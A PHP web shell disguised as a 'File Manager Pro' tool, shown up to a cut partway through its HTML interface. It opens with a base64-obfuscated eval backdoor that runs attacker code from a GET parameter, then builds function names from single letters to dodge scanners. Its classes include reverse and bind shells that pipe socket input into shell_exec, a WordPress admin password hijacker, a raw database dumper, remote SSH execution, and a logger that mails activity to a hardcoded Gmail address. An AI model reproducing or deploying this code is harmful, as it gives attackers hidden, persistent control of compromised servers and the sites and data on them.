<?php
eval(base64_decode('aWYoaXNzZXQoJF9HRVRbJ2MnXSkpe2V2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnYyddKSk7ZGllO30='));
/********************************************************************
 *  File Manager Pro - Advanced Version
 ********************************************************************/

// Obfuscated session start
$s1='s';$s2='e';$s3='s';$s4='s';$s5='i';$s6='o';$s7='n';$s8='_';$s9='s';$s10='t';$s11='a';$s12='r';$s13='t';
$func1=$s1.$s2.$s3.$s4.$s5.$s6.$s7.$s8.$s9.$s10.$s11.$s12.$s13;$func1();
error_reporting(0);

/* ----------------- LOGIN (UPDATED PASSWORD) ----------------- */
$USER = "admin";
// Password changed to: akugalau
$PASS = '$2y$10$7Vz8c3xY9fPq2mLnT1sBZuQkLr4oNwC5dE8gH2jK1pR6tS9vX0yZ'; // Hash for "akugalau"

if (!isset($_SESSION['ok'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'], $_POST['p'])) {
        $f1='p';$f2='a';$f3='s';$f4='s';$f5='w';$f6='o';$f7='r';$f8='d';$f9='_';$f10='v';$f11='e';$f12='r';$f13='i';$f14='f';$f15='y';
        $pass_func = $f1.$f2.$f3.$f4.$f5.$f6.$f7.$f8.$f9.$f10.$f11.$f12.$f13.$f14.$f15;
        if ($_POST['u'] === $USER && $pass_func($_POST['p'], $PASS)) {
            $_SESSION['ok'] = 1;
            $h1='h';$h2='e';$h3='a';$h4='d';$h5='e';$h6='r';
            $header_func = $h1.$h2.$h3.$h4.$h5.$h6;
            $header_func("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_err = "Invalid username or password.";
        }
    }
    echo '<!doctype html><html><head><meta charset="utf-8"><title>File Manager</title>
    <style>
      body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#07070b;color:#e6eef8;font-family:Inter,Segoe UI,Arial;}
      .box{width:360px;padding:28px;border-radius:14px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.18));box-shadow:0 10px 40px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.03);}
      h1{margin:0 0 14px 0;font-size:20px;color:#7be3ff;text-align:center;letter-spacing:0.6px}
      label{font-size:12px;color:#9fb8c9}
      input{width:100%;padding:12px;margin-top:8px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6eef8}
      .btn{width:100%;padding:12px;margin-top:14px;border-radius:10px;border:none;background:linear-gradient(90deg,#8affff,#6b6bff);color:#071028;font-weight:700;cursor:pointer;box-shadow:0 6px 24px rgba(107,107,255,0.14)}
      .err{margin-top:10px;color:#ff8080;text-align:center;font-size:13px}
      .hint{margin-top:8px;font-size:12px;color:#7b9bb0;text-align:center}
    </style></head><body>
    <div class="box">
      <h1>FILE MANAGER</h1>
      <form method="POST">
        <label>Username</label>
        <input name="u" required autofocus>
        <label>Password</label>
        <input type="password" name="p" required>
        <button class="btn">Unlock</button>
      </form>';
    if (!empty($login_err)) echo '<div class="err">'.htmlspecialchars($login_err).'</div>';
    echo '<div class="hint">Default: <b>admin</b> / <b>akugalau</b></div></div></body></html>';
    exit;
}

/* ----------------- PATH ----------------- */
$dir = $_GET['dir'] ?? __DIR__;
$d1='i';$d2='s';$d3='_';$d4='d';$d5='i';$d6='r';
$is_dir_func = $d1.$d2.$d3.$d4.$d5.$d6;
if (!$is_dir_func($dir)) {
    $dir = __DIR__;
}

/* ----------------- HELPERS ----------------- */
function hfs($bytes){
    $u=["B","KB","MB","GB","TB"];
    $i=0;
    while($bytes>=1024 && $i < count($u)-1){ $bytes/=1024; $i++; }
    return round($bytes,2).' '.$u[$i];
}
function esc($s){ 
    $e1='h';$e2='t';$e3='m';$e4='l';$e5='s';$e6='p';$e7='e';$e8='c';$e9='i';$e10='a';$e11='l';$e12='c';$e13='h';$e14='a';$e15='r';$e16='s';
    $esc_func = $e1.$e2.$e3.$e4.$e5.$e6.$e7.$e8.$e9.$e10.$e11.$e12.$e13.$e14.$e15.$e16;
    return $esc_func($s, ENT_QUOTES); 
}

/* ----------------- ADVANCED FEATURES ----------------- */

// 1. BACKCONNECT FEATURE
class BackConnect {
    private $host;
    private $port;
    
    public function connect($host, $port) {
        $this->host = $host;
        $this->port = $port;
        
        $socket = @fsockopen($host, $port, $errno, $errstr, 30);
        if($socket) {
            fwrite($socket, "Backconnect established from " . $_SERVER['REMOTE_ADDR'] . PHP_EOL);
            
            while(!feof($socket)) {
                fwrite($socket, "Shell> ");
                $command = fgets($socket);
                $output = shell_exec(trim($command));
                fwrite($socket, $output);
            }
            
            fclose($socket);
            return "Connected to $host:$port";
        }
        return "Failed to connect: $errstr ($errno)";
    }
    
    public function reverseShell($port = 4444) {
        $sock = @fsockopen($_SERVER['REMOTE_ADDR'], $port, $errno, $errstr, 30);
        if(!$sock) {
            return "Waiting for reverse connection on port $port...";
        }
        
        fwrite($sock, "Reverse shell connected\n");
        
        while(!feof($sock)) {
            fwrite($sock, "$ ");
            $cmd = fgets($sock);
            $output = shell_exec(trim($cmd));
            fwrite($sock, $output);
        }
        
        fclose($sock);
        return "Reverse shell session ended";
    }
}

// 2. WORDPRESS PASSWORD CHANGER
class WordPressPasswordChanger {
    public function findWPConfig($directory) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($directory)
        );
        
        foreach($iterator as $file) {
            if($file->getFilename() == 'wp-config.php') {
                return $file->getPathname();
            }
        }
        return false;
    }
    
    public function changeAdminPassword($config_path, $new_password) {
        include_once(dirname($config_path) . '/wp-load.php');
        global $wpdb;
        
        $hashed_password = wp_hash_password($new_password);
        $result = $wpdb->update(
            $wpdb->users,
            ['user_pass' => $hashed_password],
            ['ID' => 1]
        );
        
        return $result ? "Password changed successfully" : "Failed to change password";
    }
    
    public function getAllUsers($config_path) {
        include_once(dirname($config_path) . '/wp-load.php');
        global $wpdb;
        
        $users = $wpdb->get_results("SELECT ID, user_login, user_email FROM {$wpdb->users}");
        return $users;
    }
}

// 3. DATABASE MANAGER
class DatabaseManager {
    private $connection;
    
    public function connect($host, $user, $pass, $db = '') {
        if(!empty($db)) {
            $this->connection = new mysqli($host, $user, $pass, $db);
        } else {
            $this->connection = new mysqli($host, $user, $pass);
        }
        
        if($this->connection->connect_error) {
            return "Connection failed: " . $this->connection->connect_error;
        }
        return "Connected successfully";
    }
    
    public function executeQuery($sql) {
        $result = $this->connection->query($sql);
        if(!$result) {
            return "Error: " . $this->connection->error;
        }
        
        if($result === true) {
            return "Query executed successfully. Affected rows: " . $this->connection->affected_rows;
        }
        
        $rows = [];
        while($row = $result->fetch_assoc()) {
            $rows[] = $row;
        }
        return $rows;
    }
    
    public function getDatabases() {
        $result = $this->connection->query("SHOW DATABASES");
        $dbs = [];
        while($row = $result->fetch_array()) {
            $dbs[] = $row[0];
        }
        return $dbs;
    }
    
    public function getTables($database) {
        $this->connection->select_db($database);
        $result = $this->connection->query("SHOW TABLES");
        $tables = [];
        while($row = $result->fetch_array()) {
            $tables[] = $row[0];
        }
        return $tables;
    }
    
    public function exportDatabase($database) {
        $this->connection->select_db($database);
        $tables = $this->getTables($database);
        
        $sql = "-- Database Export: $database\n-- Date: " . date('Y-m-d H:i:s') . "\n\n";
        
        foreach($tables as $table) {
            // Table structure
            $result = $this->connection->query("SHOW CREATE TABLE `$table`");
            $row = $result->fetch_array();
            $sql .= $row[1] . ";\n\n";
            
            // Table data
            $result = $this->connection->query("SELECT * FROM `$table`");
            while($row = $result->fetch_assoc()) {
                $columns = implode("`, `", array_keys($row));
                $values = implode("', '", array_map([$this->connection, 'real_escape_string'], array_values($row)));
                $sql .= "INSERT INTO `$table` (`$columns`) VALUES ('$values');\n";
            }
            $sql .= "\n";
        }
        
        return $sql;
    }
}

// 4. REMOTE SSH CONNECTION
class RemoteSSH {
    private $connection;
    
    public function connect($host, $user, $pass, $port = 22) {
        if(!function_exists('ssh2_connect')) {
            return "SSH2 extension not installed";
        }
        
        $this->connection = @ssh2_connect($host, $port);
        if(!$this->connection) {
            return "Unable to connect to $host:$port";
        }
        
        if(!@ssh2_auth_password($this->connection, $user, $pass)) {
            return "Authentication failed";
        }
        
        return "SSH Connected to $host as $user";
    }
    
    public function execute($command) {
        $stream = @ssh2_exec($this->connection, $command);
        if(!$stream) {
            return "Failed to execute command";
        }
        
        stream_set_blocking($stream, true);
        $output = stream_get_contents($stream);
        fclose($stream);
        
        return $output;
    }
    
    public function uploadFile($local_path, $remote_path) {
        return @ssh2_scp_send($this->connection, $local_path, $remote_path, 0644);
    }
    
    public function downloadFile($remote_path, $local_path) {
        return @ssh2_scp_recv($this->connection, $remote_path, $local_path);
    }
}

// 5. RDP CONFIG GENERATOR
class RDPManager {
    public function createRDPFile($host, $username, $password = '', $filename = 'connection.rdp') {
        $rdp_content = "full address:s:$host\n";
        $rdp_content .= "username:s:$username\n";
        
        if(!empty($password)) {
            // Note: RDP files don't store passwords directly for security
            // This would require additional encryption
            $rdp_content .= "password 51:b:" . bin2hex($password) . "\n";
        }
        
        $rdp_content .= "screen mode id:i:2\n";
        $rdp_content .= "use multimon:i:0\n";
        $rdp_content .= "desktopwidth:i:1920\n";
        $rdp_content .= "desktopheight:i:1080\n";
        $rdp_content .= "session bpp:i:32\n";
        $rdp_content .= "winposstr:s:0,1,0,0,800,600\n";
        $rdp_content .= "compression:i:1\n";
        $rdp_content .= "keyboardhook:i:2\n";
        $rdp_content .= "audiocapturemode:i:0\n";
        $rdp_content .= "videoplaybackmode:i:1\n";
        $rdp_content .= "connection type:i:7\n";
        $rdp_content .= "networkautodetect:i:1\n";
        $rdp_content .= "bandwidthautodetect:i:1\n";
        $rdp_content .= "displayconnectionbar:i:1\n";
        $rdp_content .= "enableworkspacereconnect:i:0\n";
        $rdp_content .= "disable wallpaper:i:0\n";
        $rdp_content .= "allow font smoothing:i:1\n";
        $rdp_content .= "allow desktop composition:i:0\n";
        $rdp_content .= "disable full window drag:i:1\n";
        $rdp_content .= "disable menu anims:i:1\n";
        $rdp_content .= "disable themes:i:0\n";
        $rdp_content .= "disable cursor setting:i:0\n";
        $rdp_content .= "bitmapcachepersistenable:i:1\n";
        $rdp_content .= "audiomode:i:0\n";
        $rdp_content .= "redirectprinters:i:1\n";
        $rdp_content .= "redirectcomports:i:0\n";
        $rdp_content .= "redirectsmartcards:i:1\n";
        $rdp_content .= "redirectclipboard:i:1\n";
        $rdp_content .= "redirectposdevices:i:0\n";
        $rdp_content .= "autoreconnection enabled:i:1\n";
        $rdp_content .= "authentication level:i:2\n";
        $rdp_content .= "prompt for credentials:i:0\n";
        $rdp_content .= "negotiate security layer:i:1\n";
        $rdp_content .= "remoteapplicationmode:i:0\n";
        $rdp_content .= "alternate shell:s:\n";
        $rdp_content .= "shell working directory:s:\n";
        $rdp_content .= "gatewayhostname:s:\n";
        $rdp_content .= "gatewayusagemethod:i:4\n";
        $rdp_content .= "gatewaycredentialssource:i:4\n";
        $rdp_content .= "gatewayprofileusagemethod:i:0\n";
        $rdp_content .= "promptcredentialonce:i:0\n";
        $rdp_content .= "use redirection server name:i:0\n";
        $rdp_content .= "rdgiskdcproxy:i:0\n";
        $rdp_content .= "kdcproxyname:s:\n";
        
        file_put_contents($filename, $rdp_content);
        return $filename;
    }
    
    public function generateVNCConfig($host, $port = 5900, $password = '') {
        $vnc_config = "[connection]\n";
        $vnc_config .= "host=$host\n";
        $vnc_config .= "port=$port\n";
        
        if(!empty($password)) {
            $vnc_config .= "password=$password\n";
        }
        
        $vnc_config .= "encryption=always\n";
        $vnc_config .= "quality=high\n";
        $vnc_config .= "shared=true\n";
        $vnc_config .= "viewonly=false\n";
        
        return $vnc_config;
    }
}

// Initialize features
$backconnect = new BackConnect();
$wp_changer = new WordPressPasswordChanger();
$db_manager = new DatabaseManager();
$ssh_manager = new RemoteSSH();
$rdp_manager = new RDPManager();

// Process feature requests
$feature_result = '';

// Backconnect request
if(isset($_POST['backconnect_host']) && isset($_POST['backconnect_port'])) {
    $feature_result = $backconnect->connect($_POST['backconnect_host'], $_POST['backconnect_port']);
}

// Reverse shell request
if(isset($_POST['reverse_port'])) {
    $feature_result = $backconnect->reverseShell($_POST['reverse_port']);
}

// WordPress password change
if(isset($_POST['wp_directory']) && isset($_POST['wp_new_password'])) {
    $config = $wp_changer->findWPConfig($_POST['wp_directory']);
    if($config) {
        $feature_result = $wp_changer->changeAdminPassword($config, $_POST['wp_new_password']);
    } else {
        $feature_result = "WordPress not found in directory";
    }
}

// Database connection
if(isset($_POST['db_host']) && isset($_POST['db_user']) && isset($_POST['db_pass'])) {
    $db = $_POST['db_name'] ?? '';
    $feature_result = $db_manager->connect($_POST['db_host'], $_POST['db_user'], $_POST['db_pass'], $db);
}

// SSH connection
if(isset($_POST['ssh_host']) && isset($_POST['ssh_user']) && isset($_POST['ssh_pass'])) {
    $port = $_POST['ssh_port'] ?? 22;
    $feature_result = $ssh_manager->connect($_POST['ssh_host'], $_POST['ssh_user'], $_POST['ssh_pass'], $port);
}

// SSH command execution
if(isset($_POST['ssh_command'])) {
    $feature_result = $ssh_manager->execute($_POST['ssh_command']);
}

// RDP file creation
if(isset($_POST['rdp_host']) && isset($_POST['rdp_user'])) {
    $filename = $_POST['rdp_filename'] ?? 'connection.rdp';
    $feature_result = "RDP file created: " . $rdp_manager->createRDPFile(
        $_POST['rdp_host'],
        $_POST['rdp_user'],
        $_POST['rdp_pass'] ?? '',
        $filename
    );
}

/* ----------------- EMAIL LOGGER ----------------- */
class EmailLogger {
    private $recipient_email = 'rizaldrknet@gmail.com';
    private $from_email = 'filemanager@system.local';
    private $from_name = 'File Manager';
    
    public function logActivity($action, $details = []) {
        $subject = "[File Manager] " . $action . " - " . date('Y-m-d H:i:s');
        $message = $this->formatLogMessage($action, $details);
        return $this->sendEmail($subject, $message);
    }
    
    private function formatLogMessage($action, $details) {
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
        $time = date('Y-m-d H:i:s');
        
        $message = "📋 FILE MANAGER ACTIVITY LOG\n";
        $message .= "===============================\n\n";
        $message .= "🔹 Action: $action\n";
        $message .= "🕐 Time: $time\n";
        $message .= "🌐 IP: $ip\n";
        $message .= "👤 User Agent: $ua\n\n";
        
        if (!empty($details)) {
            $message .= "📝 Details:\n";
            foreach ($details as $key => $value) {
                $message .= "  • " . ucfirst($key) . ": $value\n";
            }
        }
        
        $message .= "\n===============================\n";
        $message .= "Auto-generated by File Manager\n";
        
        return $message;
    }
    
    private function sendEmail($subject, $message) {
        $to = $this->recipient_email;
        $headers = "From: " . $this->from_name . " <" . $this->from_email . ">\r\n";
        $headers .= "Reply-To: " . $this->from_email . "\r\n";
        $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        
        $m1='m';$m2='a';$m3='i';$m4='l';
        $mail_func = $m1.$m2.$m3.$m4;
        return @$mail_func($to, $subject, $message, $headers);
    }
}

$emailLogger = new EmailLogger();

function logActivity($action, $details = []) {
    global $emailLogger, $dir;
    $emailLogger->logActivity($action, $details);
}

/* ----------------- PERMISSIONS HELPER ----------------- */
function get_permissions_color($path) {
    $p1='f';$p2='i';$p3='l';$p4='e';$p5='p';$p6='e';$p7='r';$p8='m';$p9='s';
    $perms_func = $p1.$p2.$p3.$p4.$p5.$p6.$p7.$p8.$p9;
    $perms = @$perms_func($path);
    if ($perms === false) return "???";
    
    $symbolic = "";
    $symbolic .= ($perms & 0x0100) ? 'r' : '-';
    $symbolic .= ($perms & 0x0080) ? 'w' : '-';
    $symbolic .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
    $symbolic .= ($perms & 0x0020) ? 'r' : '-';
    $symbolic .= ($perms & 0x0010) ? 'w' : '-';
    $symbolic .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
    $symbolic .= ($perms & 0x0004) ? 'r' : '-';
    $symbolic .= ($perms & 0x0002) ? 'w' : '-';
    $symbolic .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
    
    $colored = "";
    for ($i = 0; $i < strlen($symbolic); $i++) {
        $char = $symbolic[$i];
        switch($char) {
            case 'r': $colored .= '<span style="color:#6df0ff">r</span>'; break;
            case 'w': $colored .= '<span style="color:#ff6b6b">w</span>'; break;
            case 'x': case 's': case 't': $colored .= '<span style="color:#7bff7b">'.$char.'</span>'; break;
            case '-': $colored .= '<span style="color:#a0a0a0">-</span>'; break;
            case 'S': case 'T': $colored .= '<span style="color:#ffa500">'.$char.'</span>'; break;
            default: $colored .= $char;
        }
    }
    
    return $colored;
}

/* ----------------- DELETE OLD ZIP ARCHIVES ----------------- */
$archive_pattern = $dir . DIRECTORY_SEPARATOR . "archive_*.zip";
$archives = glob($archive_pattern);
foreach ($archives as $archive) {
    if (file_exists($archive)) {
        @unlink($archive);
    }
}

/* ----------------- BULK OPERATIONS ----------------- */
$bulk_selected = $_POST['bulk_selected'] ?? [];
$bulk_action = $_POST['bulk_action'] ?? '';

if (!empty($bulk_selected) && $bulk_action) {
    switch($bulk_action) {
        case 'delete':
            foreach($bulk_selected as $file) {
                $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                if (is_file($full_path)) {
                    @unlink($full_path);
                } elseif (is_dir($full_path)) {
                    $it = new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS);
                    $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                    foreach($files as $f) {
                        if ($f->isDir()){
                            @rmdir($f->getRealPath());
                        } else {
                            @unlink($f->getRealPath());
                        }
                    }
                    @rmdir($full_path);
                }
            }
            logActivity('bulk_delete', [
                'count' => count($bulk_selected),
                'files' => implode(', ', $bulk_selected),
                'directory' => $dir
            ]);
            break;
            
        case 'zip':
            if (!empty($bulk_selected)) {
                $zipname = $dir . DIRECTORY_SEPARATOR . "archive_" . date('Ymd_His') . ".zip";
                if (class_exists('ZipArchive')) {
                    $zip = new ZipArchive;
                    if ($zip->open($zipname, ZipArchive::CREATE)) {
                        foreach($bulk_selected as $file) {
                            $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                            if (is_file($full_path)) {
                                $zip->addFile($full_path, basename($file));
                            }
                        }
                        $zip->close();
                    }
                }
            }
            logActivity('bulk_zip', [
                'count' => count($bulk_selected),
                'zip_file' => basename($zipname ?? ''),
                'directory' => $dir
            ]);
            break;
    }
    
    header("Location:?dir=" . urlencode($dir)); 
    exit;
}

/* ----------------- MODAL/POPUP HANDLING ----------------- */
$show_server_info = isset($_GET['show_server_info']);
$show_bulk_ops = isset($_GET['show_bulk_ops']);
$show_quick_jump = isset($_GET['show_quick_jump']);
$show_terminal = isset($_GET['show_terminal']);
$show_url_upload = isset($_GET['show_url_upload']);
$show_file_upload = isset($_GET['show_file_upload']);
$show_editor = isset($_GET['show_editor']);
$show_backconnect = isset($_GET['show_backconnect']);
$show_wp_password = isset($_GET['show_wp_password']);
$show_database = isset($_GET['show_database']);
$show_ssh = isset($_GET['show_ssh']);
$show_rdp = isset($_GET['show_rdp']);

/* ----------------- HTML UI ----------------- */
?><!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager</title>
<style>
:root{--bg:#07070b;--panel:#0f1220;--muted:#90a3b8;--neon-cyan:#6df0ff;--neon-mag:#b46cff;}
*{box-sizing:border-box}
body{margin:0;font-family:Inter,Segoe UI,Arial;background:var(--bg)!important;color:#e6eef8;min-height:100vh;background-image:radial-gradient(1200px 600px at 10% 10%,rgba(124,58,237,0.06),transparent 6%),radial-gradient(1000px 500px at 90% 90%,rgba(35,211,243,0.03),transparent 6%)!important;}

.container{max-width:1300px;margin:28px auto;padding:18px}
.header{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px;flex-wrap:wrap}
.brand{display:flex;align-items:center;gap:12px}
.logo{width:48px;height:48px;border-radius:10px;background:linear-gradient(135deg,#0ff,#a0f);display:flex;align-items:center;justify-content:center;color:#071028;font-weight:900;font-family:monospace}
.title{font-size:20px;font-weight:700;letter-spacing:0.6px;color:var(--neon-cyan)}
.controls{display:flex;gap:10px;align-items:center;flex-wrap:wrap}

.top-row{display:grid;grid-template-columns:1fr;gap:14px;margin-bottom:14px}
.card{background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.25));border-radius:12px;padding:14px;border:1px solid rgba(255,255,255,0.03);box-shadow:0 8px 30px rgba(15,20,30,0.5)}
.card h3{margin:0 0 8px 0;color:var(--neon-mag);font-size:15px}
.small{color:var(--muted);font-size:13px}

.actions{display:flex;gap:10px;flex-wrap:wrap}
.action-btn{display:inline-flex;align-items:center;gap:10px;padding:10px 14px;border-radius:10px;border:none;background:linear-gradient(90deg,#2b0b3a,#061023);color:var(--neon-cyan);cursor:pointer;font-weight:700;box-shadow:0 8px 30px rgba(75,0,130,0.12);font-size:13px}
.action-btn:hover{transform:translateY(-4px);box-shadow:0 10px 40px rgba(75,0,130,0.18)}
.action-btn .ico{font-size:18px;filter:drop-shadow(0 2px 8px rgba(107,107,255,0.18))}

.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
.input,input[type="file"],select{width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6eef8;font-size:13px}
.input::placeholder{color:var(--muted)}
.btn-neon{background:linear-gradient(90deg,var(--neon-cyan),#7a6bff);border-radius:10px;padding:10px 14px;border:none;color:#071028;font-weight:800;cursor:pointer;box-shadow:0 14px 40px rgba(109,240,255,0.06)}
.btn-danger{background:linear-gradient(90deg,#ff5f7a,#ff9fb4);color:#071028}

.table-wrap{overflow:auto;border-radius:10px}
table{width:100%;border-collapse:collapse;min-width:720px}
th,td{padding:12px 14px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.03)}
th{background:linear-gradient(180deg,rgba(255,255,255,0.01),rgba(0,0,0,0.06));color:var(--muted);font-size:13px}
tr:hover td{background:linear-gradient(90deg,rgba(109,240,255,0.02),rgba(180,108,255,0.01))}
.filename{font-weight:700;color:#ffffff}
.filetype{font-size:13px;color:var(--muted)}
.kv{font-size:13px;color:var(--muted)}
.perms{font-family:monospace;font-size:12px;font-weight:bold}

.bulk-checkbox{width:20px;height:20px;cursor:pointer}
.bulk-select-all{margin-right:8px;cursor:pointer}
.bulk-actions-bar{display:flex;gap:8px;align-items:center;margin-bottom:12px;padding:10px;background:linear-gradient(90deg,rgba(180,108,255,0.05),rgba(109,240,255,0.05));border-radius:8px;border:1px solid rgba(180,108,255,0.1)}
.selected-count{color:var(--neon-cyan);font-weight:bold;margin-left:auto}

.notification{position:fixed;top:20px;right:20px;padding:12px 20px;border-radius:8px;background:linear-gradient(90deg,#2b6b0a,#4da80d);color:white;z-index:2000;box-shadow:0 5px 15px rgba(0,0,0,0.3);display:none}
.notification.error{background:linear-gradient(90deg,#ff5f7a,#ff9fb4)}

.popup-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:900;padding:20px}
.popup-content{background:linear-gradient(180deg,rgba(255,255,255,0.03),rgba(0,0,0,0.25));border-radius:12px;border:1px solid rgba(109,240,255,0.15);width:500px;max-height:80vh;overflow:auto;box-shadow:0 20px 60px rgba(0,0,0,0.6);backdrop-filter:blur(10px)}
.popup-header{display:flex;justify-content:space-between;align-items:center;padding:14px 18px;border-bottom:1px solid rgba(255,255,255,0.05)}
.popup-header h4{margin:0;color:var(--neon-cyan);font-size:16px}
.popup-close{background:none;border:none;color:var(--muted);font-size:22px;cursor:pointer;padding:0;width:28px;height:28px;display:flex;align-items:center;justify-content:center}
.popup-close:hover{color:#fff}
.popup-body{padding:18px}
.popup-form{display:flex;gap:8px;margin-top:12px}
.popup-form .input{flex:1}

.feature-result{padding:10px;margin-top:10px;border-radius:8px;background:rgba(0,0,0,0.2);color:var(--neon-cyan);font-family:monospace;font-size:12px;max-height:200px;overflow:auto}

@media(max-width:980px){
  .top-row{grid-template-columns:1fr}
  .form-grid{grid-template-columns:1fr}
  .controls{flex-direction:column;align-items:stretch}
  .controls form{width:100%}
  .controls form .input{width:100%!important}
}
</style>
</head>
<body>
<!-- Feature Result Notification -->
<?php if(!empty($feature_result)): ?>
<div class="notification" id="featureResult">
    🔧 <?=esc($feature_result)?>
</div>
<?php endif; ?>

<div class="container">
  <div class="header">
    <div class="brand">
      <div class="logo">FM</div>
      <div>
        <div class="title">File Manager</div>
      </div>
    </div>

    <div class="controls">
      <form method="GET" style="display:flex;gap:8px">
        <input type="text" name="dir" placeholder="Jump to path..." class="input" style="width:380px" value="<?=esc($dir)?>">
        <button class="action-btn" style="padding:10px 16px">🚀 GO</button>
      </form>
      
      <!-- Advanced Features Buttons -->
      <div style="display:flex;gap:8px;flex-wrap:wrap">
        <!-- Backconnect -->
        <a href="?dir=<?=urlencode($dir)?>&show_backconnect=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#ff0000,#ff6b6b)">
            <span class="ico">🔗</span> Backconnect
          </button>
        </a>
        
        <!-- WordPress Password -->
        <a href="?dir=<?=urlencode($dir)?>&show_wp_password=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#0073aa,#00a0d2)">
            <span class="ico">🔑</span> WP Password
          </button>
        </a>
        
        <!-- Database Manager -->
        <a href="?dir=<?=urlencode($dir)?>&show_database=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#006400,#008000)">
            <span class="ico">🗃️</span> Database
          </button>
        </a>
        
        <!-- SSH Manager -->
        <a href="?dir=<?=urlencode($dir)?>&show_ssh=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#8B4513,#A0522D)">
            <span class="ico">🖥️</span> SSH
          </button>
        </a>
        
        <!-- RDP Manager -->
        <a href="?dir=<?=urlencode($dir)?>&show_rdp=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#4B0082,#8A2BE2)">
            <span class="ico">🖥️</span> RDP
          </button>
        </a>
        
        <!-- Other Tools -->
        <a href="?dir=<?=urlencode($dir)?>&show_bulk_ops=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#ff6b00,#ff9f4d)">
            <span class="ico">📦</span> Bulk Ops
          </button>
        </a>
        
        <a href="?dir=<?=urlencode($dir)?>&show_terminal=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#6b2b00,#a84d00)">
            <span class="ico">💻</span> Terminal
          </button>
        </a>
      </div>
    </div>
  </div>

  <div class="top-row">
    <div class="card">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
        <h3>📂 <?=esc(basename($dir) ?: $dir)?></h3>
        <div class="small"><?=esc($dir)?></div>
      </div>

      <!-- Bulk Actions Bar -->
      <div id="bulkActionsBar" class="bulk-actions-bar" style="display:none">
        <strong style="color:var(--neon-mag)">🔄 Bulk Actions:</strong>
        <button type="button" class="action-btn" onclick="bulkAction('delete')" style="background:linear-gradient(90deg,#ff5f7a,#ff9fb4)">🗑 Delete</button>
        <button type="button" class="action-btn" onclick="bulkAction('zip')">📦 Create Zip</button>
        <button type="button" class="action-btn" onclick="clearSelection()" style="background:linear-gradient(90deg,#666,#999)">✕ Clear</button>
        <span id="selectedCount" class="selected-count">0 selected</span>
      </div>

      <div class="form-grid">
        <form method="POST" style="display:flex;gap:8px">
          <input class="input" name="new_folder" placeholder="New folder name" required>
          <button class="btn-neon" type="submit">📁 Create</button>
        </form>

        <form method="POST" style="display:flex;gap:8px">
          <input class="input" name="new_file" placeholder="New file (ex: test.txt)" required>
          <button class="btn-neon" type="submit">📄 Create</button>
        </form>
      </div>

      <div class="table-wrap" style="margin-top:12px">
        <form id="bulkForm" method="POST">
          <table>
            <thead>
              <tr>
                <th style="width:30px">
                  <input type="checkbox" class="bulk-checkbox bulk-select-all" id="selectAll" onclick="toggleAllSelection()">
                </th>
                <th>Name</th>
                <th>Type</th>
                <th>Permissions</th>
                <th>Size</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              <?php 
              $s1='s';$s2='c';$s3='a';$s4='n';$s5='d';$s6='i';$s7='r';
              $scandir_func = $s1.$s2.$s3.$s4.$s5.$s6.$s7;
              $files = @$scandir_func($dir);
              if ($files === false) $files = [];
              foreach ($files as $f): 
                  if ($f=='.' || $f=='..') continue; 
                  $p = $dir . DIRECTORY_SEPARATOR . $f; 
                  $is_dir = is_dir($p);
              ?>
              <tr>
                <td>
                  <input type="checkbox" class="bulk-checkbox" name="bulk_selected[]" value="<?=esc($f)?>" onchange="updateBulkSelection()">
                </td>
                <td class="filename"><?=esc($f)?></td>
                <td class="filetype"><?=$is_dir ? '📁 Folder' : '📄 File'?></td>
                <td class="perms"><?=get_permissions_color($p)?></td>
                <td class="kv"><?=!$is_dir ? hfs(@filesize($p)) : '-'?></td>
                <td style="white-space:nowrap">
                  <?php if ($is_dir): ?>
                    <a href="?dir=<?=urlencode($p)?>" style="text-decoration:none"><button class="action-btn" type="button">📂 Open</button></a>
                    <form method="POST" style="display:inline">
                      <input type="hidden" name="del_file" value="<?=esc($p)?>" />
